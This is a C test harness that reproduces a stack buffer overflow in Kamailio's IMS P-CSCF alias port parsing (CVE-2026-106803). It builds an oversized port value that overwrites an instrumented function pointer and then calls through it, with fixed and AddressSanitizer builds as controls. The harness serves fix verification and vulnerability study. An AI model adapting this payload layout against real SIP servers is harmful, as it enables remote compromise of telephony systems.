/*
 * Extracted harness — Kamailio ims_registrar_pcscf alias port overflow
 * CVE-2026-106803 / fix commit 21261436492f0014930e804e20586e3833bb91b9.
 *
 * The parse below is copied from the PINNED vulnerable source
 * src/notify.c.6.1.4 (tag 6.1.4), function process_contact(), the
 * alias=host~port~proto branch. The two vulnerable statements are kept
 * byte-for-byte in structure:
 *
 *     received_port_len = trans - port;
 *     memcpy(bufport, port, received_port_len);
 *     bufport[received_port_len] = 0;
 *
 * with the pinned declaration `char bufport[5];`. `neighbour` is
 * INSTRUMENTATION standing in for the adjacent locals / saved frame state
 * of the real process_contact() stack frame, so chosen-byte overwrite is
 * observable deterministically. This is NOT a Kamailio build: the real
 * parse_uri(), usrloc calls and stack layout are not exercised here.
 *
 * Build modes:
 *   gcc ... alias_overflow.c -o vuln            rungs 1/2/4 + fixed control
 *   gcc -fsanitize=address ... -o asan           rung 3 (RUN_RUNG=3)
 *   gcc -DFIXED ... -o fixed                     fixed control
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define ALIAS "alias="
#define ALIAS_LEN 6
#define NEIGHBOUR_LEN 160
#define PORTBUF_MAX 512

typedef void (*marker_fn)(void);

/* INSTRUMENTED overlay of the adjacent stack region. */
/* INSTRUMENTED overlay starting at the copied buffer's first byte.
 * The 80-byte copy lands port[64..71] on fnptr and port[72..79] on stamp. */
struct victim {
	char skip[5]; /* the pinned bufport[5] itself */
	unsigned char pad[59];
	uintptr_t fnptr;
	unsigned char stamp[8];
};

/* Extracted frame: the pinned 5-byte buffer followed by instrumentation. */
struct frame {
	char bufport[5];
	unsigned char neighbour[NEIGHBOUR_LEN];
};

static volatile unsigned long marker_hits;

static void marker(void)
{
	marker_hits++;
	printf("MARKER EXECUTED\n");
}


/*
 * Reproduce the pinned alias branch of process_contact().
 * params holds `alias=<host>~<port>~<proto>`, possibly after other params.
 */
static int parse_alias(const char *params, size_t params_len,
		struct frame *f, size_t *out_len)
{
	const char *rest = params, *sep, *val, *port, *trans;
	size_t rest_len = params_len, val_len;
	int has_alias = 0;
	unsigned int received_port_len, received_proto;
	char proto_ch;
#ifdef ASAN_MODE
	/* ASan instruments whole objects only: a standalone local array makes
	 * the overflow visible, exactly as the pinned bufport[5] local does. */
	char bufport[5];
#else
	char *bufport = f->bufport; /* INSTRUMENTED overlay, see struct frame */
#endif

	while(rest_len >= ALIAS_LEN) {
		if(strncmp(rest, ALIAS, ALIAS_LEN) == 0) {
			has_alias = 1;
			break;
		}
		sep = memchr(rest, ';', rest_len);
		if(sep == NULL)
			break;
		rest_len -= (size_t)(sep - rest + 1);
		rest = sep + 1;
	}
	if(!has_alias) {
		return -1;
	}

	val = rest + ALIAS_LEN;
	val_len = rest_len - ALIAS_LEN;
	port = memchr(val, 126 /* ~ */, val_len);
	if(port == NULL) {
		printf("NO_FIRST_TILDE\n");
		return -1;
	}
	port++;
	if((size_t)(port - val) > val_len) {
		printf("BAD_TILDE\n");
		return -1;
	}
	trans = memchr(port, 126 /* ~ */, val_len - (size_t)(port - val));
	if(trans == NULL) {
		printf("NO_SECOND_TILDE\n");
		return -1;
	}

	/* ---- pinned vulnerable statements ---- */
	received_port_len = (unsigned int)(trans - port);
	trans = trans + 1;
	if((size_t)(trans - val) > val_len) {
		printf("NO_PROTO\n");
		return -1;
	}
	proto_ch = *trans;
	received_proto = (unsigned int)(unsigned char)proto_ch - 48 /* '0' */;

#ifdef FIXED
	if(received_port_len >= 5) {
		printf("REJECTED len=%u\n", received_port_len);
		return -2;
	}
#endif

	memcpy(bufport, port, received_port_len);
	bufport[received_port_len] = 0;
	/* ---- end pinned vulnerable statements ---- */

	if(out_len)
		*out_len = received_port_len;
	printf("PARSED len=%u proto=%u\n", received_port_len, received_proto);
	return 0;
}

/* Build `alias=10.0.0.1~<raw port bytes>~<proto>` in a caller buffer. */
static size_t make_params(const unsigned char *port, size_t port_len,
		char proto, char *out, size_t cap)
{
	static const char prefix[] = "alias=10.0.0.1~";
	size_t n = strlen(prefix), i;
	if(n + port_len + 2 > cap)
		exit(90);
	memcpy(out, prefix, n);
	for(i = 0; i < port_len; i++)
		out[n + i] = (char)port[i];
	n += port_len;
	out[n++] = '~';
	out[n++] = proto;
	out[n] = '\0';
	return n;
}

static int check(const char *name, int ok)
{
	printf("%s: %s\n", name, ok ? "PASS" : "FAIL");
	return ok ? 0 : 1;
}

int main(int argc, char **argv)
{
	unsigned char port[PORTBUF_MAX];
	char params[PORTBUF_MAX + 64];
	struct frame f;
	struct victim *v;
	size_t port_len, params_len, captured_len = 0;
	int len, rc = 0;
	const char *rung = getenv("RUN_RUNG");

	(void)argc;
	(void)argv;

	/* --- rung 1: 5-digit port (65535) already writes one byte past bufport[5] --- */
	if(!rung || strcmp(rung, "1") == 0) {
		memset(&f, 0, sizeof(f));
		port_len = make_params((const unsigned char *)"65535", 5, '1',
				params, sizeof(params));
		printf("RUN rung1 declared=5 actual=5\n");
		parse_alias(params, port_len, &f, &captured_len);
		rc |= check("RUNG1_5DIGIT_NUL_OOB", captured_len == 5);
	}

	/* --- rung 2/3: long chosen port overflows the 5-byte buffer --- */
	if(!rung || strcmp(rung, "2") == 0 || strcmp(rung, "3") == 0) {
		memset(&f, 0, sizeof(f));
		memset(port, 'A', sizeof(port));
		port_len = 80; /* 64 pad + 8 fnptr + 8 stamp */
		memset(port, 'B', 64);
		/* chosen pointer: address of marker(), little-endian */
		{
			uintptr_t p = (uintptr_t)(void *)&marker;
			int i;
			for(i = 0; i < (int)sizeof(p); i++)
				port[64 + i] = (unsigned char)(p >> (8 * i));
		}
		memcpy(port + 72, "KAMAILIO", 8);
		params_len = make_params(port, port_len, '1', params, sizeof(params));
		printf("RUN rung2/3 declared=5 actual=%zu oob=%zu first_oob=5\n",
				port_len, port_len - 5);
		parse_alias(params, params_len, &f, &captured_len);
		if(!rung || strcmp(rung, "2") == 0) {
			v = (struct victim *)(void *)&f;
			rc |= check("RUNG2_LEN_CAPTURED", captured_len == 80);
			rc |= check("RUNG2_FNPTR_CHANGED", v->fnptr == (uintptr_t)(void *)&marker);
			rc |= check("RUNG2_STAMP_CHANGED",
					memcmp(v->stamp, "KAMAILIO", 8) == 0);
		}
	}

#ifndef FIXED
	/* --- rung 4: call through the chosen pointer, instrumented only --- */
	if(!rung || strcmp(rung, "4") == 0) {
		marker_hits = 0;
		v = (struct victim *)(void *)&f;
		printf("RUN rung4 instrumented chosen-pointer call\n");
		((marker_fn)v->fnptr)();
		rc |= check("RUNG4_MARKER_EXECUTED", marker_hits == 1);
	}
#endif

#ifdef FIXED
	/* --- fixed control: the pinned fix rejects before the copy --- */
	if(!rung || strcmp(rung, "fixed") == 0) {
		memset(&f, 0xCC, sizeof(f));
		memset(port, 'Z', sizeof(port));
		params_len = make_params(port, 80, '1', params, sizeof(params));
		printf("RUN fixed-control\n");
		len = parse_alias(params, params_len, &f, &captured_len);
		rc |= check("FIXED_REJECTED", len == -2);
		rc |= check("FIXED_NEIGHBOUR_CLEAN",
				f.neighbour[0] == 0xCC && f.neighbour[NEIGHBOUR_LEN - 1] == 0xCC);
	}
#endif


	printf("DONE rc=%d\n", rc);
	return rc;
}
